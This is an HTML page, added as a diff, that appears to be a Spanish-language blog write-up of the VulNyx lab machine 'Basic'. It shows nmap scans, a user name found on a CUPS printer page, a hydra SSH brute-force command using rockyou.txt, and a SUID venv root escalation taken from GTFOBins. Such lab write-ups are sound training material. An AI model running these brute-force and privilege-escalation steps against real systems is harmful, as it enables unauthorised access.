@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">VulNyx - Basic | noname</title>
+<meta property="og:title" content="VulNyx - Basic | noname" />
+<meta name="twitter:title" content="VulNyx - Basic | noname" />
+<meta itemprop="name" content="VulNyx - Basic | noname" />
+<meta name="application-name" content="VulNyx - Basic | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Basic 🟢">
+<meta itemprop="description" content="Writeup Basic 🟢" />
+<meta property="og:description" content="Writeup Basic 🟢" />
+<meta name="twitter:description" content="Writeup Basic 🟢" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta property="og:image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.png" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.png" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-30T20:25:10&#43;0200 />
+    <meta property="article:published_time" content=2023-10-30T20:25:10&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "VulNyx - Basic",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-30",
+        "description": "Writeup Basic 🟢",
+        "wordCount":  228 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-30",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/images\/logo.png"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/basic/">
+    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "" class="notransition">
+<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">VulNyx - Basic</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-30T20:25:10&#43;02:00" itemprop="datePublished"> Oct 30, 2023 </time>
+                </div>
+            </header><div class="page-content">
+                <p><img src="/../machines/nyx/basic/basic_logo.webp" alt="logo"></p>
+<ul>
+<li><em>Brute Force SSH</em></li>
+<li><em>Abuse venv Binary - SUID Privesc</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -T5 -n -v 192.168.1.129
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh
+</span></span><span style="display:flex;"><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span>631/tcp open  ipp
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -sVC -v -Pn -p 22,80,631 192.168.1.129
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
+</span></span><span style="display:flex;"><span>|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: POST OPTIONS HEAD GET
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 (Debian)
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Test Debian Default Page: It works
+</span></span><span style="display:flex;"><span>631/tcp open  ipp     CUPS 2.3
+</span></span><span style="display:flex;"><span>|_http-title: Inicio - CUPS 2.3.3op2
+</span></span><span style="display:flex;"><span>| http-robots.txt: 1 disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: CUPS/2.3 IPP/2.1
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="http-tcp---80">HTTP TCP - 80</h3>
+<p><img src="/../machines/nyx/basic/whatweb.webp" alt="whatweb"></p>
+<h3 id="http--tcp---631">HTTP  TCP - 631</h3>
+<p>En el puerto <strong>631</strong> encuentro un servidor <strong>CUPS</strong>.</p>
+<p><img src="/../machines/nyx/basic/cups.webp" alt="cups"></p>
+<p>En el apartado impresoras encuentro <code>dimitri_printer</code>, esto me hace pensar que <strong>dimitri</strong> podría ser un usuario del sistema.</p>
+<p><img src="/../machines/nyx/basic/impresoras.webp" alt="impresoras"></p>
+<p>Realizo fuerza bruta al usuario <strong>dimitri</strong> y encuentra una contraseña.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>hydra -t 30 -l dimitri -P /usr/share/wordlists/rockyou.txt  ssh://192.168.1.129 -f -I -V
+</span></span><span style="display:flex;"><span>[22][ssh] host: 192.168.1.129   login: dimitri   password: m****e
+</span></span></code></pre></div><p>Me conecto al sistema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ssh dimitri@192.168.1.129
+</span></span><span style="display:flex;"><span>dimitri@192.168.1.129&#39;s password: 
+</span></span><span style="display:flex;"><span>dimitri@basic:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span></code></pre></div><p>Enumero permisos <strong>SUID</strong>.</p>
+<p><img src="/../machines/nyx/basic/SUID.webp" alt="SUID"></p>
+<p>Con <code>gtfobins-cli</code> busco el binario <strong>venv</strong>.</p>
+<p><img src="/../machines/nyx/basic/gtfobins.webp" alt="gtfobins"></p>
+<p>Obtengo el root siguiendo los pasos de <strong>gtfobins</strong>.</p>
+<p><img src="/../machines/nyx/basic/root.webp" alt="root"></p>
+<p>Y aquí termina la máquina Basic.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article>
+    </main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
+        theme on
+        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+    
+    
+    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>
+
+
+    </body>
+</html>
